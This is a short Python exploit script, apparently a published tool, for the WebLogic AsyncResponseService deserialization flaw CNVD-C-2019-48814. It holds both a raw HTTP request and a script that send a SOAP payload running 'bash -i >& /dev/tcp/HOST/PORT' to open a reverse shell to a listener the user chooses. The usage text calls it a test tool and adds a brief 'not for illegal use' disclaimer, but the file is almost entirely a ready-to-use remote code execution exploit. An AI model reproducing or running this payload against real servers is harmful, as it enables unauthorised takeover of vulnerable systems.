#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os,sys
from urllib import request 


'''
POST /_async/AsyncResponseService HTTP/1.1
Host: 172.17.0.2:7001
Content-Length: 762
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive


<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <void class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="3"> <void index="0"> <string>/bin/bash</string> </void> <void index="1"> <string>-c</string> </void> <void index="2"> <string>bash -i &gt;&amp; /dev/tcp/172.17.0.1/4444 0&gt;&amp;1</string> </void> </array> <void method="start"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope>
'''


if len(sys.argv) < 4:
    sys.stdout.write("* CNVD-C-2019-48814 反弹SHELL测试工具 - 2019.04")
    sys.stdout.write("\n* 使用帮助 #> python3 %s TARGET REVERESE_HOST REVERSE_PORT" % __file__ )
    sys.stdout.write("\n* 使用样例 #> python3 %s http://172.17.0.2:7001 172.17.0.1 4444" % __file__ )
    sys.stdout.write("\n* 本工具仅供测试使用，请勿用于非法用途\n")
    exit()
    
#bash -i >& /dev/tcp/172.17.0.1/4444 0>&1

target = sys.argv[1]
reverse_host = sys.argv[2]
reverse_port = sys.argv[3]

if not target.startswith("http"):
    print("Please specify target schema, like http:// or https:// ")
    exit()

headers={
    "content-type": "text/xml"
}

exp_url = "%s/_async/AsyncResponseService" % target

exp_data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <void class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="3"> <void index="0"> <string>/bin/bash</string> </void> <void index="1"> <string>-c</string> </void> <void index="2"> <string>bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1</string> </void> </array> <void method="start"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope>""" % (reverse_host,reverse_port)


req = request.Request( exp_url, data=exp_data.encode(), headers=headers )

resp = request.urlopen(req)

if resp.code == 202:
    print("Exploit successful.")

